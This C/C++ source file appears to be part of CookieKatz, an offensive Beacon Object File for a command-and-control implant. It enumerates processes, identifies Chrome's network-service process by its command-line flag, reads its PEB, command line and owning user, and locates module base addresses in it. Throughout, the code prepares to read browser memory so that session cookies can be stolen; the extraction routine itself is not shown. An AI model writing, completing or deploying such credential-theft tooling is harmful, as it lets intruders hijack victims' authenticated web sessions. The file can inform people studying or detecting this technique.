
extern "C" {
#include "../../CookieKatz/PEB.h"
#include "..\DFR.h"
#include "../beacon.h"

    typedef enum _PROCESSINFOCLASS {
        ProcessBasicInformation,
        ProcessQuotaLimits,
        ProcessIoCounters,
        ProcessVmCounters,
        ProcessTimes,
        ProcessBasePriority,
        ProcessRaisePriority,
        ProcessDebugPort,
        ProcessExceptionPort,
        ProcessAccessToken,
        ProcessLdtInformation,
        ProcessLdtSize,
        ProcessDefaultHardErrorMode,
        ProcessIoPortHandlers,
        ProcessPooledUsageAndLimits,
        ProcessWorkingSetWatch,
        ProcessUserModeIOPL,
        ProcessEnableAlignmentFaultFixup,
        ProcessPriorityClass,
        ProcessWx86Information,
        ProcessHandleCount,
        ProcessAffinityMask,
        ProcessPriorityBoost,
        ProcessDeviceMap,
        ProcessSessionInformation,
        ProcessForegroundInformation,
        ProcessWow64Information,
        ProcessImageFileName,
        ProcessLUIDDeviceMapsEnabled,
        ProcessBreakOnTermination,
        ProcessDebugObjectHandle,
        ProcessDebugFlags,
        ProcessHandleTracing,
        ProcessIoPriority,
        ProcessExecuteFlags,
        ProcessTlsInformation,
        ProcessCookie,
        ProcessImageInformation,
        ProcessCycleTime,
        ProcessPagePriority,
        ProcessInstrumentationCallback,
        ProcessThreadStackAllocation,
        ProcessWorkingSetWatchEx,
        ProcessImageFileNameWin32,
        ProcessImageFileMapping,
        ProcessAffinityUpdateMode,
        ProcessMemoryAllocationMode,
        ProcessGroupInformation,
        ProcessTokenVirtualizationEnabled,
        ProcessConsoleHostProcess,
        ProcessWindowInformation,
        MaxProcessInfoClass			 // MaxProcessInfoClass should always be the last enum
    } PROCESSINFOCLASS;

    typedef LONG KPRIORITY;

    typedef struct _PROCESS_BASIC_INFORMATION {
        NTSTATUS ExitStatus;
        PPEB PebBaseAddress;
        ULONG_PTR AffinityMask;
        KPRIORITY BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

    typedef NTSTATUS(NTAPI* NtQueryInformationProcess)(
        IN  HANDLE ProcessHandle,
        IN  PROCESSINFOCLASS ProcessInformationClass,
        OUT PVOID ProcessInformation,
        IN  ULONG ProcessInformationLength,
        OUT PULONG ReturnLength OPTIONAL
        );

#define MAX_NAME 256 //Maximum name length for GetTokenUser. Don't know what the MS specification actually is

    BOOL GetTokenUser(IN HANDLE hProcess, wchar_t* UserName, wchar_t* DomainName, DWORD dwMaxUserName, DWORD dwMaxDomainName) {

        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to OpenProcessToken! Error: %i\n", GetLastError());
            return FALSE;
        }

        PTOKEN_USER hTokenUser = { 0 };
        DWORD dwSize = 0;

        if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize)) {
            DWORD dwError = GetLastError();
            if (dwError != ERROR_INSUFFICIENT_BUFFER) {
                BeaconPrintf(CALLBACK_ERROR, "GetTokenInformation failed to get token size! Error: %i\n", GetLastError());
                return FALSE;
            }
        }
        hTokenUser = (PTOKEN_USER)malloc(dwSize);
        if (hTokenUser == NULL) {
            return FALSE;
        }

        if (!GetTokenInformation(hToken, TokenUser, hTokenUser, dwSize, &dwSize)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve token information! Error: %i\n", GetLastError());
            free(hTokenUser);
            return FALSE;
        }

        UserName[0] = L'\0';
        DomainName[0] = L'\0';
        SID_NAME_USE SidUser = SidTypeUser;
        if (!LookupAccountSidW(NULL, hTokenUser->User.Sid, UserName, &dwMaxUserName, DomainName, &dwMaxDomainName, &SidUser)) {
            BeaconPrintf(CALLBACK_ERROR, "LookupAccountSidW failed! Error: %i\n", GetLastError());
            free(hTokenUser);
            return FALSE;
        }

        free(hTokenUser);
        return TRUE;
    }

    BOOL ReadRemoteProcessPEB(IN HANDLE hProcess, OUT PEB* peb) {

        HMODULE hNtDll = LoadLibraryW(L"ntdll.dll");
        if (hNtDll == NULL || hNtDll == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "LoadLibrary could not load NTDLL! Error: %i\n", GetLastError());
            return FALSE;
        }
        NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");

        PROCESS_BASIC_INFORMATION processInfo{ 0 };
        ULONG szInfo = 0;

        if (SUCCEEDED(pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(PROCESS_BASIC_INFORMATION), &szInfo))
            && szInfo == sizeof(PROCESS_BASIC_INFORMATION)
            && processInfo.PebBaseAddress) {

            size_t szPEB = 0;

            if (!ReadProcessMemory(hProcess, processInfo.PebBaseAddress, peb, sizeof(PEB), &szPEB) || szPEB < sizeof(PEB)) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to read Chrome PEB! Error: %i\n", GetLastError());
                return FALSE;
            }
            else
                return TRUE;
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "ProcessBasicInformation failed! Error: %i\n", GetLastError());
            return FALSE;
        }

        return FALSE;
    }

    BOOL ReadPEBProcessParameters(HANDLE hProcess, PEB* peb, WCHAR** args) {

        UNICODE_STRING commandLine;
        if (!ReadProcessMemory(hProcess, &peb->ProcessParameters->CommandLine, &commandLine, sizeof(commandLine), NULL))
        {
            BeaconPrintf(CALLBACK_ERROR, "Could not read CommandLine! Error: %i\n", GetLastError());
            return FALSE;
        }

        *args = (WCHAR*)malloc(commandLine.MaximumLength);
        if (*args != 0 && !ReadProcessMemory(hProcess, commandLine.Buffer, *args, commandLine.MaximumLength, NULL))
        {
            BeaconPrintf(CALLBACK_ERROR, "Could not read the command line string! Error: %i\n", GetLastError());
            free(*args);
            return FALSE;
        }

        return TRUE;
    }

    //wcsstr has an overload and so the dynamic resolution doesn't work
    //Classic way of defining functions for BOFs would work, but that would break the debug build
    //This sphaghetti solutions does well for now
    const wchar_t* CustomWcsStr(const wchar_t* dest, const wchar_t* src) {
        if (*src == L'\0')
            return dest;

        while (*dest != L'\0') {
            const wchar_t* h = dest;
            const wchar_t* n = src;

            while (*n != L'\0' && towlower(*h) == towlower(*n)) {
                ++h;
                ++n;
            }
            if (*n == L'\0')
                return dest;

            ++dest;
        }
        return nullptr;
    }

    void FindAllSuitableProcesses(LPCWSTR processName)
    {
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed! Error: %i\n", GetLastError());
            return;
        }

        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (!Process32FirstW(hProcessSnap, &pe32))
        {
            BeaconPrintf(CALLBACK_ERROR, "Process32FirstW failed! Error: %i\n", GetLastError());
            CloseHandle(hProcessSnap);
            return;
        }

        //Target Chrome process has the following flag, this is how we find the right PID
        //--utility-sub-type=network.mojom.NetworkService
        const WCHAR* flags = L"--utility-sub-type=network.mojom.NetworkService";

        do
        {
            if (wcscmp(pe32.szExeFile, processName) == 0)
            {
                PEB peb = { 0 };
                HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (ReadRemoteProcessPEB(hHandle, &peb))
                {
                    WCHAR* commandLine{ 0 };
                    if (ReadPEBProcessParameters(hHandle, &peb, &commandLine) && &commandLine != 0)
                    {
                        if (CustomWcsStr(commandLine, flags) != 0)
                        {
                            wchar_t UserName[MAX_NAME];
                            wchar_t DomainName[MAX_NAME];
                            if (GetTokenUser(hHandle, UserName, DomainName, MAX_NAME, MAX_NAME))
                            {
                                BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d (%ls\\%ls)\n", pe32.th32ProcessID, DomainName, UserName);
                            }
                            else
                            {
                                BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d\n", pe32.th32ProcessID);
                            }
                        }
                    }
                    free(commandLine);
                }
            }

        } while (Process32NextW(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);
        return;
    }

    BOOL FindCorrectProcessPID(LPCWSTR processName, DWORD* pid, HANDLE* hProcess)
    {
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed! Error: %i\n", GetLastError());
            return FALSE;
        }
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        if (!Process32FirstW(hProcessSnap, &pe32))
        {
            BeaconPrintf(CALLBACK_ERROR, "Process32FirstW failed! Error: %i\n", GetLastError());
            CloseHandle(hProcessSnap);
            return FALSE;
        }

        //Target Chrome process has the following flag, this is how we find the right PID
        //--utility-sub-type=network.mojom.NetworkService
        const WCHAR* flags = L"--utility-sub-type=network.mojom.NetworkService";

        do
        {
            if (wcscmp(pe32.szExeFile, processName) == 0)
            {
                PEB peb = { 0 };
                HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (ReadRemoteProcessPEB(hHandle, &peb))
                {
                    WCHAR* commandLine{ 0 };
                    if (ReadPEBProcessParameters(hHandle, &peb, &commandLine) && &commandLine != 0)
                    {
                        if (CustomWcsStr(commandLine, flags) != 0)
                        {
                            wchar_t UserName[MAX_NAME];
                            wchar_t DomainName[MAX_NAME];
                            if (GetTokenUser(hHandle, UserName, DomainName, MAX_NAME, MAX_NAME))
                            {
                                BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d (%ls\\%ls)\n", pe32.th32ProcessID, DomainName, UserName);
                            }
                            else
                            {
                                BeaconPrintf(CALLBACK_OUTPUT, "Found browser process: %d\n", pe32.th32ProcessID);
                            }

                            *pid = pe32.th32ProcessID;
                            *hProcess = hHandle;
                            free(commandLine);
                            CloseHandle(hProcessSnap);
                            return TRUE;
                        }
                    }
                    free(commandLine);
                }
                CloseHandle(hHandle);
            }

        } while (Process32NextW(hProcessSnap, &pe32));

        CloseHandle(hProcessSnap);
        return FALSE;
    }

    BOOL GetRemoteModuleBaseAddress(HANDLE hProcess, const wchar_t* moduleName, uintptr_t& baseAddress, DWORD* moduleSize) {

        size_t szModules = sizeof(HMODULE) * 1024; //Should be enough ;)
        HMODULE* hModules = (HMODULE*)malloc(szModules);
        DWORD cbNeeded;
        if (hModules == 0 || !K32EnumProcessModulesEx(hProcess, hModules, szModules, &cbNeeded, LIST_MODULES_ALL))
        {
            BeaconPrintf(CALLBACK_ERROR, "K32EnumProcessModulesEx failed! Error: %i\n", GetLastError());
            free(hModules);
            return FALSE;
        }

        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i) {
            wchar_t szModuleName[MAX_PATH];
            if (!K32GetModuleBaseNameW(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(wchar_t))) {
                BeaconPrintf(CALLBACK_ERROR, "K32GetModuleBaseNameW failed! Error: %i\n", GetLastError());
                continue;
            }
            if (_wcsicmp(szModuleName, moduleName) == 0) {
                MODULEINFO moduleInfo;
                if (K32GetModuleInformation(hProcess, hModules[i], &moduleInfo, sizeof(moduleInfo))) {
                    baseAddress = reinterpret_cast<uintptr_t>(moduleInfo.lpBaseOfDll);
                    *moduleSize = moduleInfo.SizeOfImage;
                    free(hModules);
                    return TRUE;
                }
                else
                    BeaconPrintf(CALLBACK_ERROR, "K32GetModuleInformation failed! Error: %i\n", GetLastError());
            }
        }
        free(hModules);
        return FALSE;
    }

    BOOL GetChromeHandle(DWORD pid, HANDLE* hProcess) {
        *hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (*hProcess == NULL || *hProcess == INVALID_HANDLE_VALUE)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to OpenProcess PID:%d, Error: %i\n", pid, GetLastError());
            return FALSE;
        }
        return TRUE;
    }
}